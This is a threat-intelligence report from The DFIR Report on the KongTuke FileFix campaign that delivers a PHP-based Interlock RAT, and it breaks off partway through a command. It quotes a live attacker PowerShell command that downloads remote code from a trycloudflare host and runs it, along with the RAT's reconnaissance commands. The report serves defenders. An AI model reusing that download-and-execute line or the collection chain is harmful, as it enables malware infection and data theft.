---
title: KongTuke FileFix Leads to New Interlock RAT Variant
url: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
source: Over Security - Cybersecurity news aggregator
date: 2025-07-15
fetch_date: 2025-10-06T23:49:59.046753
---

# KongTuke FileFix Leads to New Interlock RAT Variant

[Skip to content](#content)

Menu

* [Reports](https://thedfirreport.com/)
* [Analysts](https://thedfirreport.com/analysts/)
* [Services](https://thedfirreport.com/services/)
  + [Threat Intelligence](https://thedfirreport.com/services/threat-intelligence/)
  + [Detection Rules](https://thedfirreport.com/services/detection-rules/)
  + [DFIR Labs](https://thedfirreport.com/services/dfir-labs/)
    - [Digital Forensics Challenge](https://thedfirreport.com/services/dfir-labs/ctf/)
    - [Leaderboard](https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/)
    - [Digital Forensics Challenge Winners](https://thedfirreport.com/services/dfir-labs/digital-forensics-challenge-winners/)
    - [Testimonials](https://thedfirreport.com/services/dfir-labs/testimonials/)
  + [Case Artifacts](https://thedfirreport.com/services/case-artifacts/)
* [Access DFIR Labs](https://dfirlabs.thedfirreport.com/)
* [Subscribe](https://thedfirreport.com/subscribe/)
* [Contact Us](https://thedfirreport.com/contact/)

Menu

* [Threat Intelligence](https://thedfirreport.com/services/threat-intelligence/)
* [Detection Rules](https://thedfirreport.com/services/detection-rules/)
* [DFIR Labs](https://thedfirreport.com/services/dfir-labs/)
  + [Digital Forensics Challenge](https://thedfirreport.com/services/dfir-labs/ctf/)
  + [Leaderboard](https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/)
  + [Digital Forensics Challenge Winners](https://thedfirreport.com/services/dfir-labs/digital-forensics-challenge-winners/)
  + [Testimonials](https://thedfirreport.com/services/dfir-labs/testimonials/)
* [Case Artifacts](https://thedfirreport.com/services/case-artifacts/)

[The DFIR Report](https://thedfirreport.com/)

Real Intrusions by Real Attackers, The Truth Behind the Intrusion

Menu

* [Reports](https://thedfirreport.com/)
* [Analysts](https://thedfirreport.com/analysts/)
* [Services](https://thedfirreport.com/services/)
  + [Threat Intelligence](https://thedfirreport.com/services/threat-intelligence/)
  + [Detection Rules](https://thedfirreport.com/services/detection-rules/)
  + [DFIR Labs](https://thedfirreport.com/services/dfir-labs/)
    - [Digital Forensics Challenge](https://thedfirreport.com/services/dfir-labs/ctf/)
    - [Leaderboard](https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/)
    - [Digital Forensics Challenge Winners](https://thedfirreport.com/services/dfir-labs/digital-forensics-challenge-winners/)
    - [Testimonials](https://thedfirreport.com/services/dfir-labs/testimonials/)
  + [Case Artifacts](https://thedfirreport.com/services/case-artifacts/)
* [Access DFIR Labs](https://dfirlabs.thedfirreport.com/)
* [Subscribe](https://thedfirreport.com/subscribe/)
* [Contact Us](https://thedfirreport.com/contact/)

Monday, October 06, 2025

Menu

* [Threat Intelligence](https://thedfirreport.com/services/threat-intelligence/)
* [Detection Rules](https://thedfirreport.com/services/detection-rules/)
* [DFIR Labs](https://thedfirreport.com/services/dfir-labs/)
  + [Digital Forensics Challenge](https://thedfirreport.com/services/dfir-labs/ctf/)
  + [Leaderboard](https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/)
  + [Digital Forensics Challenge Winners](https://thedfirreport.com/services/dfir-labs/digital-forensics-challenge-winners/)
  + [Testimonials](https://thedfirreport.com/services/dfir-labs/testimonials/)
* [Case Artifacts](https://thedfirreport.com/services/case-artifacts/)

[Flash Alert](https://thedfirreport.com/category/flash-alert/)

# KongTuke FileFix Leads to New Interlock RAT Variant

[July 14, 2025](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)

Researchers from The DFIR Report, in partnership with Proofpoint, have identified a new and resilient variant of the Interlock ransomware group’s remote access trojan (RAT). This new malware, a shift from the previously identified JavaScript-based [Interlock RAT](https://blog.sekoia.io/interlock-ransomware-evolving-under-the-radar/) (aka [NodeSnake](https://www.quorumcyber.com/wp-content/uploads/2025/06/20250416-Higher-Education-Sector-RAT.pdf)), uses PHP and is being used in a widespread campaign.

Since May 2025, activity related to the Interlock RAT has been observed in connection with the LandUpdate808 (aka KongTuke) web-inject threat clusters. The campaign begins with compromised websites injected with a single-line script hidden in the page’s HTML, often unbeknownst to site owners or visitors.

The linked JavaScript employs heavy IP filtering to serve the payload, which first prompts the user to click a captcha to “Verify you are human” followed by “Verification steps” to open a run command and paste in from the clipboard. If pasted into the run command it will execute a PowerShell script which eventually leads to Interlock RAT.

Proofpoint researchers have observed both Interlock RAT Node.js and Interlock RAT PHP based variants. The Interlock RAT PHP based variant was first spotted in June 2025 campaigns.

The DFIR Report researchers have recently seen this same KongTuke web-inject transitioning to a FileFix variant.

![](https://thedfirreport.com/wp-content/uploads/2025/06/2-2.png)

This updated delivery mechanism has been observed deploying the PHP variant of the Interlock RAT, which in certain cases has then led to the deployment of the Node.js variant of the Interlock RAT. We’ll be discussing the PHP variant throughout the remainder of the report.

### Noteworthy Tradecraft & Techniques:

* **Execution**: We observed the initial execution of the Interlock RAT using the below command. This command reflects PowerShell spawning PHP with suspicious arguments, particularly the loading of the config file from a non-standard location. The PHP executable located in the user’s AppData\Roaming directory is invoked with directives to enable the ZIP extension, and a config (.cfg) file is passed as input. We created a PowerShell and Python script to parse the config which can be found [here](https://github.com/The-DFIR-Report/scripts).

```
"powershell.exe" -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\") | iex"
└── "C:\Users\REDACTED\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\\AppData\Roaming\php\wefs.cfg 1
```

* **Automated Discovery:** Upon execution, the Interlock RAT immediately performs automated reconnaissance of the compromised system. It uses a series of PowerShell commands to gather and exfiltrate a comprehensive system profile as JSON data. The collected information includes detailed system specifications (systeminfo), a list of all running processes and associated services (tasklist), running Windows services (Get-Service), all mounted drives (Get-PSDrive), and the local network neighborhood via the ARP table (Get-NetNeighbor). The malware also checks its own privilege level to determine if it is running as USER, ADMIN, or SYSTEM, allowing the threat actor to instantly understand the context of the compromise.

```
"C:\Users\REDACTED\AppData\Roaming\php\php.exe" -d extension=zip -d extension_dir=ext C:\Users\\AppData\Roaming\php\wefs.cfg 1
└── cmd.exe /s /c "powershell -c Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Permanent' } |
            Select-Object @{Name='Interface'; Expression={$_.InterfaceAlias}},
                          @{Name='Internet Address'; Expression={$_.IPAddress}},
                          @{Name='Physical Address'; Expression={$_.LinkLayerAddress}},
                          @{Name='Type'; Expression={'dynamic'}} |
            ConvertTo-Json"
└── cmd.exe /s /c "powershell -c "systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json""
└── cmd.exe /s /c "powershell -c "if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -match '(?i)SYSTEM') { 'SYSTEM' } e...